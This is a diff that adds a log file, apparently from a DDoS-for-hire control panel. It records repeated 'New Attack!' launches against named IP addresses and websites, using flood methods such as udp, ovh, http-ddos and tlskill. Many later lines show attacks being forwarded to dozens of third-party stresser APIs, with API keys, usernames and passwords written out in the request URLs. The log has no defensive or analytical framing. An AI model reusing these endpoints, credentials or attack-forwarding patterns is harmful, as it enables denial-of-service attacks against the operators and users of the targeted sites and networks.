@@ -1,0 +1,1476 @@
+2024/11/17 15:40:18 New Attack!
+Username: root
+Target: 70.70.70.70
+Port: 53
+Time: 60
+----------------------
+2024/11/17 15:40:18 failed to send Discord message: Post "YOUR_WEBHOOK_URL": unsupported protocol scheme ""
+2024/11/17 15:48:38 New Attack!
+Username: root
+Target: 70.70.70.70
+Port: 53
+Time: 60
+----------------------
+2024/11/17 15:48:46 New Attack!
+Username: root
+Target: 70.70.70.70
+Port: 53
+Time: 60
+----------------------
+2024/11/17 16:29:01 New Attack!
+Username: root
+Target: 70.70.70.70
+Port: 53
+Time: 60
+----------------------
+2024/11/17 16:29:33 New Attack!
+Username: root
+Target: 70.70.69.70
+Port: 53
+Time: 60
+----------------------
+2024/11/17 16:31:43 New Attack!
+Username: root
+Target: 70.70.70.70
+Port: 53
+Time: 60
+----------------------
+2024/11/17 16:33:01 New Attack!
+Username: root
+Target: 70.70.70.11
+Port: 53
+Time: 60
+----------------------
+2024/11/17 16:33:16 New Attack!
+Username: root
+Target: 70.70.70.6
+Port: 53
+Time: 60
+----------------------
+2024/11/17 16:35:55 New Attack!
+Username: root
+Target: 70.54.70.11
+Port: 53
+Time: 60
+----------------------
+2024/11/17 16:37:46 New Attack!
+Username: root
+Target: 70.70.70.71
+Port: 53
+Time: 60
+----------------------
+2024/11/17 16:38:22 New Attack!
+Username: root
+Target: 70.70.70.70
+Port: 53
+Time: 60
+----------------------
+2024/11/17 16:39:12 New Attack!
+Username: root
+Target: 70.70.70.71
+Port: 53
+Time: 60
+----------------------
+2024/11/24 18:30:49 New Attack!
+Username: root
+Target: 70.70.70.59
+Port: 53
+Time: 260
+Method: ovh
+----------------------
+2024/11/24 18:30:49 Request sent to https://google.com/api?key=saturn&host=70.70.70.10&port=53&time=260&method=udp, status code: 404
+2024/11/24 18:30:49 Request sent to https://google.com/api?key=saturn&host=70.70.70.59&port=53&time=260&method=udp, status code: 404
+2024/11/24 18:30:49 Request sent to https://google.com/api?key=saturn&host=70.70.70.70&port=53&time=260&method=udp, status code: 404
+2024/11/24 18:30:49 Request sent to https://google.com/api?key=saturn&host=70.70.70.24&port=53&time=260&method=udp, status code: 404
+2024/11/24 18:31:00 New Attack!
+Username: root
+Target: 70.70.70.59
+Port: 53
+Time: 60
+Method: ovh
+----------------------
+2024/11/24 18:31:00 Request sent to https://google.com/api?key=saturn&host=70.70.70.24&port=53&time=60&method=udp, status code: 404
+2024/11/24 18:31:00 Request sent to https://google.com/api?key=saturn&host=70.70.70.59&port=53&time=60&method=udp, status code: 404
+2024/11/24 18:31:00 Request sent to https://google.com/api?key=saturn&host=70.70.70.10&port=53&time=60&method=udp, status code: 404
+2024/11/24 18:31:00 Request sent to https://google.com/api?key=saturn&host=70.70.70.70&port=53&time=60&method=udp, status code: 404
+2024/11/24 21:07:36 New Attack!
+Username: root
+Target: https://filman.cc/
+Port: 443
+Time: 60
+Method: http-ddos
+----------------------
+2024/11/24 21:08:42 New Attack!
+Username: root
+Target: http://142.171.195.145
+Port: 443
+Time: 60
+Method: http-ddos
+----------------------
+2024/11/24 21:10:55 New Attack!
+Username: root
+Target: https://rosemc.pl/
+Port: 443
+Time: 60
+Method: browser
+----------------------
+2024/11/28 15:01:20 New Attack!
+Username: root
+Target: 70.70.70.70
+Port: 22
+Time: 60
+Method: ovh
+----------------------
+2024/11/28 15:01:26 New Attack!
+Username: root
+Target: 70.70.70.70
+Port: 22
+Time: 60
+Method: ovh
+----------------------
+2024/11/28 15:01:35 New Attack!
+Username: root
+Target: 70.70.70.70
+Port: 22
+Time: 60
+Method: tlskill
+----------------------
+2024/11/28 15:06:58 New Attack!
+Username: root
+Target: 70.70.70.70
+Port: 22
+Time: 60
+Method: ovh
+----------------------
+2024/11/28 15:06:58 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:06:58 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:06:58 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:06:58 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:06:58 [INFO] Attack information sent to user interface
+2024/11/28 15:07:00 New Attack!
+Username: root
+Target: 70.70.70.70
+Port: 22
+Time: 60
+Method: ovh
+----------------------
+2024/11/28 15:07:00 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:07:00 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:07:00 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:07:00 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:07:00 [INFO] Attack information sent to user interface
+2024/11/28 15:07:01 New Attack!
+Username: root
+Target: 70.70.70.70
+Port: 22
+Time: 60
+Method: ovh
+----------------------
+2024/11/28 15:07:01 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:07:01 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:07:01 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:07:01 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:07:01 [INFO] Attack information sent to user interface
+2024/11/28 15:07:06 New Attack!
+Username: root
+Target: 70.70.70.70
+Port: 22
+Time: 60
+Method: ovh
+----------------------
+2024/11/28 15:07:06 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:07:06 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:07:06 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:07:06 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:07:06 [INFO] Attack information sent to user interface
+2024/11/28 15:07:07 New Attack!
+Username: root
+Target: 70.70.70.70
+Port: 22
+Time: 60
+Method: ovh
+----------------------
+2024/11/28 15:07:07 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:07:07 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:07:07 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:07:07 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:07:07 [INFO] Attack information sent to user interface
+2024/11/28 15:07:07 New Attack!
+Username: root
+Target: 70.70.70.70
+Port: 22
+Time: 60
+Method: ovh
+----------------------
+2024/11/28 15:07:07 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:07:07 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:07:07 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:07:07 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:07:07 [INFO] Attack information sent to user interface
+2024/11/28 15:09:45 New Attack!
+Username: root
+Target: https://lorawa.pl/
+Port: 443
+Time: 60
+Method: ovh
+----------------------
+2024/11/28 15:09:45 [ATTACK] Sent request to http://blankc2.fun:8080/api/attack
+2024/11/28 15:09:45 [INFO] Attack information sent to user interface
+2024/11/28 15:13:24 New Attack!
+Username: root
+Target: https://melatonin.win/
+Port: 443
+Time: 60
+Method: ovh
+----------------------
+2024/11/28 15:13:24 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:13:24 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:13:24 [ATTACK] Sent request to https://google.com/api
+2024/11/28 15:13:25 [INFO] Attack information sent to user interface
+2024/11/28 23:03:00 New Attack!
+Username: root
+Target: 70.70.70.29
+Port: 53
+Time: 60
+Method: ovh
+----------------------
+2024/11/28 23:03:00 [0m[107m[38;5;208m[REQUEST][0m[38;5;231mSending request to: [38;5;253mhttp://blankc2.fun:8080/api/attack [0m
+2024/11/28 23:03:00 [INFO] Attack information sent to user interface
+2024/11/28 23:03:05 New Attack!
+Username: root
+Target: 70.70.70.29
+Port: 53
+Time: 60
+Method: ovh
+----------------------
+2024/11/28 23:03:05 [INFO] Attack information sent to user interface
+2024/11/28 23:04:30 New Attack!
+Username: root
+Target: 70.70.70.70
+Port: 53
+Time: 30
+Method: ovh
+----------------------
+2024/11/28 23:04:30 [ATTACK] Sending request to: http://blankc2.fun:8080/api/attack
+2024/11/28 23:04:30 [ATTACK] Sending request to: http://blankc2.fun:8080/api/attack
+2024/11/28 23:04:30 [ATTACK] Sending request to: http://blankc2.fun:8080/api/attack
+2024/11/28 23:04:30 [INFO] Attack information sent to user interface
+2024/11/28 23:07:16 New Attack!
+Username: root
+Target: 70.70.70.32
+Port: 53
+Time: 60
+Method: ovh
+----------------------
+2024/11/28 23:07:16 [INFO] Attack information sent to user interface
+2024/11/28 23:08:58 New Attack!
+Username: root
+Target: 70.70.70.71
+Port: 53
+Time: 60
+Method: ovh
+----------------------
+2024/11/28 23:08:59 [INFO] Attack information sent to user interface
+2024/11/28 23:09:13 New Attack!
+Username: root
+Target: 70.70.70.71
+Port: 53
+Time: 60
+Method: ovh
+----------------------
+2024/11/28 23:09:13 [INFO] Attack information sent to user interface
+2024/11/28 23:09:52 New Attack!
+Username: root
+Target: 70.70.70.32
+Port: 53
+Time: 60
+Method: ovh
+----------------------
+2024/11/28 23:09:53 [INFO] Attack information sent to user interface
+2024/11/28 23:10:45 New Attack!
+Username: root
+Target: 70.70.70.32
+Port: 53
+Time: 60
+Method: ovh
+----------------------
+2024/11/28 23:10:46 [ATTACK] Sending request to: http://blankc2.fun:8080/api/attack
+2024/11/28 23:10:46 [INFO] Attack information sent to user interface
+2024/11/30 12:35:01 User tried to attack blocked target!
+Username: root
+Target: 69.69.69.69
+Port: 53
+Time: 60
+Method: ovh
+----------------------
+2024/12/01 19:28:35 New Attack (API)!
+Username: fury
+Target: 206.212.246.5
+Port: 53
+Time: 60
+Method: vse
+----------------------
+2024/12/01 19:28:35 Request sent to https://google.com/api?key=saturn&host=70.70.70.24&port=53&time=60&method=udp, status code: 404
+2024/12/01 19:28:35 Request sent to https://google.com/api?key=saturn&host=70.70.70.24&port=53&time=60&method=udp, status code: 404
+2024/12/01 19:28:35 Request sent to https://google.com/api?key=saturn&host=70.70.70.24&port=53&time=60&method=udp, status code: 404
+2024/12/01 19:28:35 Request sent to https://google.com/api?key=saturn&host=70.70.70.24&port=53&time=60&method=udp, status code: 404
+2024/12/03 22:21:36 New Attack (C2)!
+Username: root
+Target: 70.70.70.70
+Port: 53
+Time: 60
+Method: vse
+----------------------
+2024/12/03 22:21:36 [INFO] Attack information sent to user interface
+2024/12/03 22:23:58 New Attack (C2)!
+Username: root
+Target: 70.70.70.70
+Port: 53
+Time: 60
+Method: vse
+----------------------
+2024/12/03 22:23:59 [INFO] Attack information sent to user interface
+2024/12/03 22:25:58 New Attack (API)!
+Username: root
+Target: 70.70.70.59
+Port: 53
+Time: 60
+Method: vse
+----------------------
+2024/12/03 22:26:10 New Attack (API)!
+Username: root
+Target: 70.70.70.59
+Port: 53
+Time: 60
+Method: vse
+----------------------
+2024/12/08 10:25:02 New Attack (C2)!
+Username: root
+Target: 70.70.70.70
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2024/12/08 10:25:02 [INFO] Attack information sent to user interface
+2024/12/08 19:22:09 New Attack (C2)!
+Username: root
+Target: 70.70.70.70
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2024/12/08 19:22:09 [INFO] Attack information sent to user interface
+2024/12/08 19:24:15 New Attack (C2)!
+Username: root
+Target: 70.70.70.70
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2024/12/08 19:24:15 [INFO] Attack information sent to user interface
+2024/12/08 19:25:48 New Attack (C2)!
+Username: root
+Target: 70.70.70.70
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2024/12/08 19:25:48 [INFO] Attack information sent to user interface
+2024/12/08 19:42:18 New Attack (C2)!
+Username: fury
+Target: 70.70.70.70
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2024/12/08 19:42:19 [INFO] Attack information sent to user interface
+2024/12/09 08:53:47 New Attack (C2)!
+Username: root
+Target: 45.32.85.169
+Port: 44998
+Time: 60
+Method: game
+----------------------
+2024/12/09 08:53:47 [INFO] Attack information sent to user interface
+2024/12/10 16:21:52 New Attack (C2)!
+Username: root
+Target: 70.70.70.70
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2024/12/10 16:21:52 [INFO] Attack information sent to user interface
+2024/12/10 16:24:06 New Attack (API)!
+Username: root
+Target: 70.70.70.59
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2024/12/10 16:41:13 New Attack (API)!
+Username: root
+Target: 70.70.70.59
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2024/12/10 16:41:13 [ATTACK] Error sending request to: https://homicide-api.lol/api/attack?username=IceyCody&secret=IceyCody&host=70.70.70.59&port=53&time=60&method=!udp - Get "https://homicide-api.lol/api/attack?username=IceyCody&secret=IceyCody&host=70.70.70.59&port=53&time=60&method=!udp": dial tcp: lookup homicide-api.lol: no such host
+2024/12/10 16:41:13 [ATTACK] Error sending request to: http://virusc2.xyz:6969/api/attack?username=heiken&secret=sigma123&host=70.70.70.59&port=53&time=60&method=.UDP-GBPS - Get "http://virusc2.xyz:6969/api/attack?username=heiken&secret=sigma123&host=70.70.70.59&port=53&time=60&method=.UDP-GBPS": dial tcp: lookup virusc2.xyz: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://api.stdstresser.xyz/api/attack?username=wrykw810&secret=wrykw810&host=70.70.70.59&port=53&time=60&method=udp-dn - Get "https://api.stdstresser.xyz/api/attack?username=wrykw810&secret=wrykw810&host=70.70.70.59&port=53&time=60&method=udp-dn": dial tcp: lookup api.stdstresser.xyz: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: http://toxicipstresser.cloud:6969/api/attack?username=xdrop&secret=balls&host=70.70.70.59&port=60&time=60&method=udp - Get "http://toxicipstresser.cloud:6969/api/attack?username=xdrop&secret=balls&host=70.70.70.59&port=60&time=60&method=udp": dial tcp: lookup toxicipstresser.cloud: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.59&port=53&time=60&method=gudp-twat - Get "https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.59&port=53&time=60&method=gudp-twat": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?&key=ggbro420&host=70.70.70.59&port=53&time=60&method=udp-fun - Get "https://api.vortexa-services.xyz/api?&key=ggbro420&host=70.70.70.59&port=53&time=60&method=udp-fun": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.59&port=53&time=60&method=gudp-twat - Get "https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.59&port=53&time=60&method=gudp-twat": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: http://blankc2.fun:8080/api/attack?username=fedworld&password=123&target=70.70.70.59&port=53&time=60&method=udp - Get "http://blankc2.fun:8080/api/attack?username=fedworld&password=123&target=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup blankc2.fun: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: http://blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.59&port=53&time=60&method=dns - Get "http://blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.59&port=53&time=60&method=dns": dial tcp: lookup blankc2.fun: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: http://virusc2.xyz:6969/api/attack?username=chefe&secret=123123&host=70.70.70.59&port=53&time=60&method=.UDP-GBPS - Get "http://virusc2.xyz:6969/api/attack?username=chefe&secret=123123&host=70.70.70.59&port=53&time=60&method=.UDP-GBPS": dial tcp: lookup virusc2.xyz: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.59&port=53&time=60&method=gudp-twat - Get "https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.59&port=53&time=60&method=gudp-twat": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.59&port=53&time=60&method=udp-fun - Get "https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.59&port=53&time=60&method=udp-fun": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=ggbro900&host=70.70.70.59&port=53&time=60&method=udp - Get "https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=ggbro900&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup chronos.awaken-proxy-api.xyz: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=riley&host=70.70.70.59&port=53&time=60&method=udp - Get "https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=riley&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup chronos.awaken-proxy-api.xyz: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://brainc2.uk/api/api.php?key=projectwrld&host=70.70.70.59&port=53&time=60&method=udp - Get "https://brainc2.uk/api/api.php?key=projectwrld&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup brainc2.uk: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: http://connect-synth.xyz:3000/api/101be105959fe620/attack?&target=70.70.70.59&port=53&time=60&method=udp_api - Get "http://connect-synth.xyz:3000/api/101be105959fe620/attack?&target=70.70.70.59&port=53&time=60&method=udp_api": dial tcp: lookup connect-synth.xyz: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: http://api.quantiumcode.pl/api/attack?host=70.70.70.59&port=53&time=60&method=udp-vip&key=1234&username=darkc2 - Get "http://api.quantiumcode.pl/api/attack?host=70.70.70.59&port=53&time=60&method=udp-vip&key=1234&username=darkc2": dial tcp: lookup api.quantiumcode.pl: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://ddos.srv.lat/attack?token=nGS4bDqVidKO4qGNvF2WWw&host&host=70.70.70.59&port=53&time=60&method=!udpv2&concs=1 - Get "https://ddos.srv.lat/attack?token=nGS4bDqVidKO4qGNvF2WWw&host&host=70.70.70.59&port=53&time=60&method=!udpv2&concs=1": dial tcp: lookup ddos.srv.lat: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: http://chronos.awaken-network.net:443/api/attack?username=toring&key=toring111&host=70.70.70.59&port=53&duration=60&method=UDP - Get "http://chronos.awaken-network.net:443/api/attack?username=toring&key=toring111&host=70.70.70.59&port=53&duration=60&method=UDP": dial tcp: lookup chronos.awaken-network.net: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://gorilla-api.su/api/attack?username=xdrop&secret=24xdrop23&host=70.70.70.59&port=53&time=60&method=dns - Get "https://gorilla-api.su/api/attack?username=xdrop&secret=24xdrop23&host=70.70.70.59&port=53&time=60&method=dns": dial tcp: lookup gorilla-api.su: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: http://hideaki-api.awaken-proxy-api.xyz:443/api/attack?username=begs&key=curry&host=70.70.70.59&port=53&time=60&method=gudp - Get "http://hideaki-api.awaken-proxy-api.xyz:443/api/attack?username=begs&key=curry&host=70.70.70.59&port=53&time=60&method=gudp": dial tcp: lookup hideaki-api.awaken-proxy-api.xyz: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: http://proxy.blankc2.fun:6968/api/attack/api/attack?username=begs&password=rileyrowe420&target=70.70.70.59&port=53&time=60&method=dns - Get "http://proxy.blankc2.fun:6968/api/attack/api/attack?username=begs&password=rileyrowe420&target=70.70.70.59&port=53&time=60&method=dns": dial tcp: lookup proxy.blankc2.fun: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://ddos.srv.lat/attack?token=MpuQPllkwUFzZ8elnu5fPU&host=70.70.70.59&port=53&time=60&method=out-udp&concs=1 - Get "https://ddos.srv.lat/attack?token=MpuQPllkwUFzZ8elnu5fPU&host=70.70.70.59&port=53&time=60&method=out-udp&concs=1": dial tcp: lookup ddos.srv.lat: no such host
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://1337.rest/api.php?api_key=2b852c3e2333f0448ba17c3df2ad18ca&target=70.70.70.59&time=60&port=53&method=UDP-BYPASS&concurrents=1
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.59&port=53&time=60&method=mix2 - Get "https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.59&port=53&time=60&method=mix2": dial tcp: lookup c2.furry.ong: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: http://proxy.blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.59&port=53&time=60&method=dns - Get "http://proxy.blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.59&port=53&time=60&method=dns": dial tcp: lookup proxy.blankc2.fun: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.59&port=53&time=60&method=mix2 - Get "https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.59&port=53&time=60&method=mix2": dial tcp: lookup c2.furry.ong: no such host
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://crtz.top/api/attack?username=tsukiapi&secret=wixkwn193jen&host=70.70.70.59&port=53&duration=60&method=UDP
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://api-sona.xyz/api/attack?username=glock&secret=glock&host=70.70.70.59&port=53&time=60&method=udp-pps
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://1337.rest/api.php?api_key=2b852c3e2333f0448ba17c3df2ad18ca&target=70.70.70.59&time=60&port=53&method=UDP-BOOM&concurrents=1
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.59&port=53&time=60&method=pps - Get "https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.59&port=53&time=60&method=pps": dial tcp: lookup api.autumn-network.xyz: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://private.bartrickc2.ovh/api/attack?username=@stopbegs&secret=@stopbegs&host=70.70.70.59&port=53&time=60&method=l4-udp - Get "https://private.bartrickc2.ovh/api/attack?username=@stopbegs&secret=@stopbegs&host=70.70.70.59&port=53&time=60&method=l4-udp": dial tcp: lookup private.bartrickc2.ovh: no such host
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.59&port=53&time=60&method=udpbypass - Get "https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.59&port=53&time=60&method=udpbypass": dial tcp: lookup api.autumn-network.xyz: no such host
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://akitz.online/api/attack?username=fedworld&key=fedworld&host=70.70.70.59&port=53&time=60&method=gudp
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://api.chryslervx.com/api/attack?username=saturnc2&password=saturnc2api&host=70.70.70.59&port=53&time=60&method=gudp_api
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://api.chryslervx.com/api/attack?username=saturnc2&password=saturnc2api&host=70.70.70.59&port=53&time=60&method=udp_api
+2024/12/10 16:41:14 [ATTACK] Sending request to: http://93.123.85.244/api/attack?key=nigga&host=70.70.70.59&port=53&time=60&method=udp-gbps
+2024/12/10 16:41:14 [ATTACK] Sending request to: http://proxy.blanknetwork.fun:8080/api/attack?username=begs&password=123&target=70.70.70.59&port=53&time=60&method=dns
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://api.chryslervx.com/api/attack?username=saturnc2&password=saturnc2api&host=70.70.70.59&port=53&time=60&method=gudp_api
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://api.tsuki-solutions.cc/api/attack?username=securinq&key=balls&host=70.70.70.59&port=53&time=60&method=udp-vip - Get "https://api.tsuki-solutions.cc/api/attack?username=securinq&key=balls&host=70.70.70.59&port=53&time=60&method=udp-vip": dial tcp: lookup api.tsuki-solutions.cc: no such host
+2024/12/10 16:41:14 [ATTACK] Sending request to: http://ddos.africa:8080/api/attack?username=moneky&password=monkey&target=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://mythicalstressapi.net/?key=j2ys2wydzbl2ir48elgojabv6rmjfs&host=70.70.70.59&port=53&time=60&method=UDPAU
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://mythicalstressapi.net/?key=j2ys2wydzbl2ir48elgojabv6rmjfs&host=70.70.70.59&port=53&time=60&method=UDPRANDOM
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://hackar.stresser.rip/api/attack?username=stopbegs&key=stopbegs&host=70.70.70.59&port=53&time=60&method=udpbypass
+2024/12/10 16:41:14 [ATTACK] Sending request to: http://93.123.85.244/api/attack?username=begs&key=noballs&host=70.70.70.59&time=60&port=60&method=UDP-LONE
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://api.papernetwork.xyz/api/attack?username=flcty&key=MBenz300&target=70.70.70.59&port=53&duration=60&method=udp
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://hackar.stresser.rip/api/attack?username=stopbegs&key=stopbegs&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:14 [ATTACK] Sending request to: http://toxic-c2.de:6969/api/attack?username=vse&secret=getfucked&host=70.70.70.59&port=53&time=60&method=UDP-VSE
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://wrldsecurity.ru/api/attack?username=projectworld&secret=u85y7r438t76g4389u6t8y943586&host=70.70.70.59&port=53&time=60&method=UDP-PPS
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://wrldsecurity.ru/api/attack?username=projectworld&secret=u85y7r438t76g4389u6t8y943586&host=70.70.70.59&port=53&time=60&method=UDP
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://insanesec.com/api/start?username=flcty&key=FEf6FfnlGsish2F&target=70.70.70.59&port=53&duration=60&method=UDP
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://wrldsecurity.ru/api/attack?username=projectworld&secret=543u7yrf893wu65t3&host=70.70.70.59&port=53&time=60&method=UDP
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://api.arthurc2.xyz/api/attack?username=begs&secret=balls&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://yuze-api.xyz/api/attack?username=x2u&secret=x2uisop$30&host=70.70.70.59&port=53&time=60&method=!udpplain
+2024/12/10 16:41:14 [ATTACK] Sending request to: http://satanservices.xyz/api/attack?username=lixl&key=iPxrkan&host=70.70.70.59&port=53&time=60&method=gudp
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://kraysecurity.com/api/api.php?key=0sUU6IW0ZAaUllWX&host=70.70.70.59&port=53&time=60&method=UDP
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://api.leanc2.dev/api/attack?username=fedworld&key=7A8hgFeWq33&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://api.vacstresser.ru/api?key=e87a0d23-f8c1-4525-bdef-c52425eb7e71&host=70.70.70.59&port=53&duration=60&method=UDPBYPASS
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://yuze-api.xyz/api/attack?username=x2u&secret=x2uisop$30&host=70.70.70.59&port=53&time=60&method=!udp
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://overdose.sbs/api/attack?username=projectworld&key=projectworld121&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:14 [ATTACK] Sending request to: http://85.192.56.228/api.php?key=milka&target=70.70.70.59&duration=60&method=gudp&method_type=udp&port=53
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://phantom.cool/api/attack?token={token}&host={host}&port={port}&time={time}&method=GUDP - Get "https://phantom.cool/api/attack?token={token}&host={host}&port={port}&time={time}&method=GUDP": dial tcp: lookup phantom.cool: no such host
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://overdose.sbs/api/attack?username=begs&key=balls&host=70.70.70.59&port=53&time=60&method=udp-dose
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://glacier-api.xyz/api/attack?username=chefe&key=Cwel123&host=70.70.70.59&time=60&port=53&method=UDP-PPS
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://aggu.spacey.sh/aggu/api?username=saturned&key=saturned&host=70.70.70.59&port=53&time=60&method=udp-bypass - Get "https://aggu.spacey.sh/aggu/api?username=saturned&key=saturned&host=70.70.70.59&port=53&time=60&method=udp-bypass": dial tcp: lookup aggu.spacey.sh: no such host
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://kodachi.xyz/api/attack?username=api&key=api1234&host=70.70.70.59&port=53&time=60&method=gudp
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://api.inverse.sh?token=2DrvPtgCrvqT0x04XmSOsY&target={target}&port={port}&duration={duration}&method=UDP-SOURCE&concs=2
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://api.inverse.sh?token=ctKmcvX4aeZVXLF2O28uHx&host=70.70.70.59&port=53&time=60&method=UDP-SOURCE
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://miami-api.cc/api/attack?username=flcty&secret=RyXMfmrXu10s&target=70.70.70.59&port=53&duration=60&method=!UDP
